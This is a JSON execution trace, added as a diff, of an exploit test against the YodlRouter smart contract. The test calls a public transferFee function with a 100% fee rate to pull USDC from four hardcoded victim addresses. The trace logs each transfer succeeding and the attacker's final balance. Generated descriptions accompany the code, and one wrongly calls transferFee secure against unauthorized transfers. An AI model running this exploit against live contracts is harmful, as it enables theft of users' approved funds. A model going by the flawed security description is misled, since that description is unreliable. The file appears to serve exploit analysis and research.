@@ -1,0 +1,177 @@
+[
+    {
+        "id": "162896",
+        "args": "",
+        "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        uint256 amount;\n        uint256 feeBps = 10_000;\n        address token = USDC;\n        address from;\n        address to = address(this);\n\n        // Victim 0\n        from = 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0;\n        amount = 45_588_747_326;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n\n        // Victim 1\n        from = 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E;\n        amount = 1_219_608_225;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n\n        // Victim 2\n        from = 0x2c349022df145C1a2eD895B5577905e6F1Bc7881;\n        amount = 1_000_000_000;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n\n        // Victim 3\n        from = 0x96D0F726FD900E199680277aAaD326fbdebc6BF9;\n        amount = 1_000_000;\n        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);\n    }\n",
+        "description": "1. **Core functions:**  \n   The `testExploit` function appears to simulate an exploit scenario by transferring fees from multiple victim addresses to the contract itself. It interacts with an external contract (referred to as `YodlRouter`) to perform these transfers. The function is designed to test or demonstrate how fees can be moved from specific addresses to the contract.\n\n2. **Security mechanism:**  \n   The function uses a custom modifier `balanceLog`, which likely logs or tracks balance changes during execution. This could be a defensive measure to monitor the state of the contract or ensure transparency during the exploit simulation. However, the function itself does not include explicit security checks like access control or input validation, which could make it vulnerable if used in a real-world scenario.\n\n3. **Parameter Function:**  \n   The function does not take any external parameters. Instead, it defines internal variables such as `amount`, `feeBps`, `token`, `from`, and `to`. These variables are used to specify the amount of tokens to transfer, the fee basis points (a percentage), the token type (USDC in this case), the source address (`from`), and the destination address (`to`). The `from` addresses are hardcoded to represent victims, while `to` is set to the contract itself.\n\n4. **Return description:**  \n   The function does not return any value. Its purpose is to execute the `transferFee` function on the `YodlRouter` contract multiple times, transferring specified amounts from the victim addresses to the contract. The logic is purely transactional, with no calculations or outputs beyond the fee transfers.\n\n**In summary,**  \nThe `testExploit` function simulates an exploit by transferring fees from multiple hardcoded victim addresses to the contract itself. It uses a custom modifier for logging or tracking balance changes but lacks explicit security measures. The function does not take external parameters or return any value, focusing solely on executing fee transfers via an external contract.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "10370",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "3081",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "3339",
+        "args": "NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2553",
+        "args": "NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3164",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6"
+    },
+    {
+        "id": "2381",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6"
+    },
+    {
+        "id": "42238",
+        "args": "45588747326 [4.558e10], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function transferFee(uint256 amount, uint256 feeBps, address token, address from, address to)\n        public\n        returns (uint256)\n    {\n        uint256 fee = calculateFee(amount, feeBps);\n        if (fee > 0) {\n            if (token != NATIVE_TOKEN) {\n                // ERC20 token\n                if (from == address(this)) {\n                    TransferHelper.safeTransfer(token, to, fee);\n                } else {\n                    // safeTransferFrom requires approval\n                    TransferHelper.safeTransferFrom(token, from, to, fee);\n                }\n            } else {\n                require(from == address(this), \"can only transfer eth from the router address\");\n\n                // Native ether\n                (bool success,) = to.call{value: fee}(\"\");\n                require(success, \"transfer failed in transferFee\");\n            }\n            return fee;\n        } else {\n            return 0;\n        }\n    }\n}\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle the transfer of a fee from one address to another. It calculates the fee based on the provided amount and fee rate, then transfers the fee using either a specific token (like ERC20) or native cryptocurrency (like Ether). The function ensures that the fee is transferred correctly depending on the type of token and the source address.\n\n2. **Security mechanism**:  \n   - The function uses `require` statements to enforce conditions, such as ensuring that native Ether can only be transferred from the contract itself, preventing unauthorized transfers.  \n   - It employs `TransferHelper.safeTransfer` and `TransferHelper.safeTransferFrom` for secure token transfers, which are designed to handle errors and ensure safe transactions.  \n   - The function checks if the fee is greater than zero before proceeding with the transfer, avoiding unnecessary operations.  \n\n3. **Parameter Function**:  \n   - `amount`: The total amount from which the fee is calculated.  \n   - `feeBps`: The fee rate in basis points (1 basis point = 0.01%), used to determine the fee amount.  \n   - `token`: The address of the token to be used for the fee transfer. If it\u2019s the native token (like Ether), a special address is used.  \n   - `from`: The address from which the fee is transferred.  \n   - `to`: The address to which the fee is sent.  \n\n4. **Return description**:  \n   The function returns the calculated fee amount if it is greater than zero. If the fee is zero, it returns zero. The fee is calculated using the `calculateFee` function, which multiplies the `amount` by the `feeBps` and divides by 10,000 to convert basis points into a percentage.  \n\nIn summary, this function securely transfers a fee from one address to another, handling both token and native cryptocurrency transfers while ensuring proper conditions and error handling.",
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000a9d4d143e"
+    },
+    {
+        "id": "40049",
+        "args": "0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45588747326 [4.558e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "39254",
+        "args": "0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45588747326 [4.558e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18338",
+        "args": "1219608225 [1.219e9], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000048b1bea1"
+    },
+    {
+        "id": "16149",
+        "args": "0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1219608225 [1.219e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15354",
+        "args": "0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1219608225 [1.219e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18338",
+        "args": "1000000000 [1e9], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x2c349022df145C1a2eD895B5577905e6F1Bc7881, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000003b9aca00"
+    },
+    {
+        "id": "16149",
+        "args": "0x2c349022df145C1a2eD895B5577905e6F1Bc7881, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000 [1e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15354",
+        "args": "0x2c349022df145C1a2eD895B5577905e6F1Bc7881, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000 [1e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18338",
+        "args": "1000000 [1e6], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x96D0F726FD900E199680277aAaD326fbdebc6BF9, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000f4240"
+    },
+    {
+        "id": "16149",
+        "args": "0x96D0F726FD900E199680277aAaD326fbdebc6BF9, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000 [1e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15354",
+        "args": "0x96D0F726FD900E199680277aAaD326fbdebc6BF9, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000 [1e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1870",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "1081",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "1339",
+        "args": "NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "47809355551 [4.78e10]"
+    },
+    {
+        "id": "553",
+        "args": "NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "47809355551 [4.78e10]"
+    },
+    {
+        "id": "1164",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6"
+    },
+    {
+        "id": "381",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6"
+    }
+]
